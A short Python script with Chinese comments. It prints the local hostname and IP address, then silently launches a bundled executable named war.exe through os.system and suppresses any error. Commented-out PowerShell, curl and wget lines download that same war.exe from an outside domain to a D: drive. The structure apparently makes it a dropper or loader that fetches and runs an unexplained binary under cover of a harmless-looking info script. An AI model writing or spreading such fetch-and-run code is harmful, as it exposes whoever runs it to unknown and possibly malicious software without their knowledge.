import os
import pathlib
import socket

# 获取当前主机名
hostname = socket.gethostname()
print(f"当前主机名称为: {hostname}")

# 根据主机名获取 IP 地址
ip_address = socket.gethostbyname(hostname)
print(f"当前主机的 IP 为: {ip_address}")

try:
    folder = pathlib.Path(__file__).parent.resolve()
    path = os.path.join(folder, "a", "war.exe")
    os.system("start "+path)
except Exception as c:
    ...



# # 使用PowerShell的Invoke-WebRequest命令下载文件
# $url = "https://example.com/path/to/your/file.txt"
# $destination = "C:\path\to\your\destination\file.txt"
# Invoke-WebRequest -Uri $url -OutFile $destination
#
# :: 使用curl下载文件
# curl -o "D:/file.exe" "https://yc.052024.xyz/a/war.exe"
#
# :: 使用wget下载文件
# wget -O "D:/file.exe" "https://yc.052024.xyz/a/war.exe"
#

